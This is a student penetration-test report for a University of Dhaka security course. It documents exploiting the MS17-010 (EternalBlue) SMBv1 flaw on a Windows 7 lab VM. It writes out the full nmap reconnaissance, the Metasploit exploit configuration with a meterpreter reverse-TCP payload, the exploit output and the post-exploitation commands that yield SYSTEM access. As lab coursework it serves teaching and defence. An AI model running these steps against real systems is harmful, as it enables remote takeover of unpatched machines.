# Landing Page

- **University:** University of Dhaka
- **Program:** Professional Masters in Information and Cyber Security
- **Title:** Exploitation of SMBv1 Vulnerability
- **Subtitle:** Hands-On Security Assessment in a Controlled Test Environment
- **Course:** CSE 807 - Information Security Management
- **Name:** Nishan Paul
- **Roll No:** JN-50028
- **Reg. No:** H-55
- **Batch:** 05
- **Submission Date:** December 21, 2025

\pagebreak

# Table of Contents
1. [Executive Summary](#1-executive-summary)
2. [Simulated Environment Setup](#2-simulated-environment-setup)
3. [Reconnaissance](#3-reconnaissance)
4. [Enumeration](#4-enumeration)
5. [Exploitation](#5-exploitation)
6. [Post-Exploitation](#6-post-exploitation)
7. [Conclusion](#7-conclusion)
8. [Appendix: Tools Used](#appendix-a-tools-used)

\pagebreak

## 1. Executive Summary

### 1.1 Objective
The primary objective of this assignment was to evaluate the security posture of a standard Windows 7 workstation within a simulated corporate network. Specifically, this test focused on the exploitability of the **MS17-010 (EternalBlue)** vulnerability when common business configurations—such as file and printer sharing—are active.

### 1.2 Impact Assessment
Through systematic exploitation, we successfully demonstrated that a remote, unauthenticated attacker could gain full administrative control over the target system. The vulnerability allows for **Remote Code Execution (RCE)** with highest-level (`SYSTEM`) privileges, bypassing standard authentication mechanisms.

### 1.3 Key Findings
*   **Critical Vulnerability:** The target system is susceptible to the EternalBlue exploit due to an unpatched SMBv1 implementation.
*   **Total Compromise:** Successful exploitation resulted in full system access, allowing for unauthorized data exfiltration.
*   **Configuration Risk:** The legitimate business requirement for SMB file sharing effectively serves as a persistent entry point for this exploit, even with an active firewall.

\pagebreak

## 2. Simulated Environment Setup

To recreate a realistic corporate scenario, we configured a target environment where SMB is legitimately enabled for business operations. This reflects a common real-world situation where IT departments allow file sharing while maintaining an active firewall.

### 2.1 Lab Infrastructure
The testing environment was built using virtualization technology to ensure a controlled and isolated setting.
- **Hypervisor:** VMware Player
- **Attack Machine:** Kali Linux (172.16.115.128)
- **Target Machine:** Windows 7 Professional SP1 (172.16.115.133)
- **Networking:** Both machines are configured on the same **Virtual NAT Network** (Subnet: 172.16.115.0/24), allowing direct communication within an isolated environment.

### 2.2 Scenario Overview
- **Environment:** Small corporate network.
- **Target:** Windows 7 workstation.
- **Operational Need:** Access to shared internal resources (files/printers).
- **Security State:** Windows Firewall is **Enabled**, but configured with standard sharing exceptions.

### 2.3 Target Configuration (Windows 7)
The following configuration steps were applied to the target to simulate a production workstation:

**Step 1: Enabling File and Printer Sharing**
This was performed to simulate standard network resource access:
1.  **Network and Sharing Center** -> **Change advanced sharing settings**.
2.  Enable **Network discovery** and **File and printer sharing**.

Verification via Command Prompt (Administrator):
```cmd
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
```

**Step 2: Firewall Integrity Check**
We confirmed the firewall was active while specifically yielding SMB traffic on port 445:
```cmd
REM Ensure firewall is active across all profiles
netsh advfirewall set allprofiles state on

REM Confirm SMB-In rules are active
netsh advfirewall firewall show rule name="File and Printer Sharing (SMB-In)"
```
This ensures the vulnerability is accessible through Port 445, even with basic security measures in place.

\pagebreak

## 3. Reconnaissance

### 3.1 Network Discovery

First, we identified live hosts on the target network:

```bash
nmap -sn 172.16.115.0/24
```

**Result:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 11:19 EST
Nmap scan report for 172.16.115.133
Host is up (0.00021s latency).
MAC Address: 00:0C:29:29:34:EA (VMware)
```

### 3.2 Port Scanning

We performed a comprehensive port scan to identify all open ports:

```bash
nmap -p- -T4 172.16.115.133 -oN ports.txt
```

**Result:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 11:21 EST
Nmap scan report for 172.16.115.133
Host is up (0.00026s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2869/tcp open  icslap
5357/tcp open  wsdapi
MAC Address: 00:0C:29:29:34:EA (VMware)
```

**Key Finding:** Port 445 (SMB) is open, which is our primary attack vector.

### 3.3 Service Detection

We gathered detailed information about running services:

```bash
nmap -sV -sC -O -p 135,139,445,3389 172.16.115.133 -oN detailed.txt
```

**Result:**
```
PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:29:34:EA (VMware)

OS details: Microsoft Windows 7 SP1; Microsoft Windows Embedded Standard 7
Service Info: Host: SANDBOX-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

\pagebreak

## 4. Enumeration

### 4.1 SMB Vulnerability Scanning

We specifically checked for the MS17-010 vulnerability:

```bash
nmap --script smb-vuln-ms17-010 -p 445 172.16.115.133
```

**Result:**
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

**Critical Finding:** The target is confirmed vulnerable to MS17-010.

### 4.2 SMB Enumeration

We gathered additional SMB information:

```bash
nmap --script smb-os-discovery,smb-security-mode -p 445 172.16.115.133
```

**Result:**
```
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: sandbox-PC
|   NetBIOS computer name: SANDBOX-PC\x00
|   Workgroup: WORKGROUP\x00
```

\pagebreak

## 5. Exploitation

### 5.1 Metasploit Setup

We launched Metasploit Framework and selected the appropriate exploit:

```bash
msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.16.115.133
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 172.16.115.128
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > set target 1
```

### 5.2 Exploit Configuration & Verification

We verified the module and payload options:

```
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         172.16.115.133   yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication...
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target...
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target...


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.115.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows 7
```

\pagebreak

### 5.3 Exploit Execution

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

**Result:**
```
[*] Started reverse TCP handler on 172.16.115.128:4444 
[*] 172.16.115.133:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.16.115.133:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 172.16.115.133:445    - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.115.133:445 - The target is vulnerable.
[*] 172.16.115.133:445 - Connecting to target for exploitation.
[+] 172.16.115.133:445 - Connection established for exploitation.
[+] 172.16.115.133:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.16.115.133:445 - CORE raw buffer dump (42 bytes)
[*] 172.16.115.133:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.16.115.133:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.16.115.133:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 172.16.115.133:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.16.115.133:445 - Trying exploit with 12 Groom Allocations.
[*] 172.16.115.133:445 - Sending all but last fragment of exploit packet
[*] 172.16.115.133:445 - Starting non-paged pool grooming
[+] 172.16.115.133:445 - Sending SMBv2 buffers
[+] 172.16.115.133:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.16.115.133:445 - Sending final SMBv2 buffers.
[*] 172.16.115.133:445 - Sending last fragment of exploit packet!
[*] 172.16.115.133:445 - Receiving response from exploit packet
[+] 172.16.115.133:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.16.115.133:445 - Sending egg to corrupted connection.
[*] 172.16.115.133:445 - Triggering free of corrupted buffer.
[*] Meterpreter session 1 opened (172.16.115.128:4444 -> 172.16.115.133:49181) at 2025-12-21 11:33:29 -0500
[+] 172.16.115.133:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.16.115.133:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.16.115.133:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

**Success:** We obtained a Meterpreter session with system access.

\pagebreak

## 6. Post-Exploitation

### 6.1 System Information

We gathered basic system information:

```
meterpreter > sysinfo
```

**Result:**
```
Computer        : SANDBOX-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

### 6.2 Privilege Verification

```
meterpreter > getuid
```

**Result:**
```
Server username: NT AUTHORITY\SYSTEM
```

**Critical Success:** We have SYSTEM-level privileges (highest possible on Windows).

### 6.3 Process Information

```
meterpreter > ps
```

**Result (truncated):**
```
 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 320   312   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 368   312   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 464   368   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 488   368   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 2024  2004  explorer.exe       x64   1        sandbox-PC\sandbox            C:\Windows\Explorer.EXE
```

### 6.4 Network Information

```
meterpreter > ipconfig
```

**Result:**
```
Interface 14
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:29:34:ea
MTU          : 1500
IPv4 Address : 172.16.115.133
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::1806:861b:8f5f:2874
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

### 6.5 File System Access

We verified full file system access:

```
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 2403-DC79

 Directory of C:\Users

08/04/2023  12:09 AM    <DIR>          .
08/04/2023  12:09 AM    <DIR>          ..
04/12/2011  02:28 PM    <DIR>          Public
08/04/2023  12:09 AM    <DIR>          sandbox
               0 File(s)              0 bytes
               4 Dir(s)  22,183,743,488 bytes free
```

\pagebreak

## 7. Conclusion

This penetration test successfully demonstrated the critical risk posed by the MS17-010 vulnerability. The exploitation process was straightforward and required minimal technical skill, highlighting the severity of leaving this vulnerability unpatched.

**Attack Chain Summary:**
1. Network reconnaissance identified target host
2. Port scanning revealed SMB service on port 445
3. Vulnerability scanning confirmed MS17-010 presence
4. Metasploit exploit achieved remote code execution
5. SYSTEM-level access obtained within minutes
6. Full system compromise and control

\pagebreak

## 8. Appendix: Tools Used

| Tool | Purpose |
|------|---------|
| VMware Player | Virtualization hypervisor for lab isolation |
| Windows 7 Professional SP1 | Target operating system |
| Kali Linux | Primary attack platform |
| Nmap | Network reconnaissance and vulnerability scanning |
| Metasploit Framework | Exploitation framework |
| Meterpreter | Post-exploitation payload |

**Report End**

*This penetration test was conducted in a controlled lab environment with proper authorization. All activities were legal and ethical.*
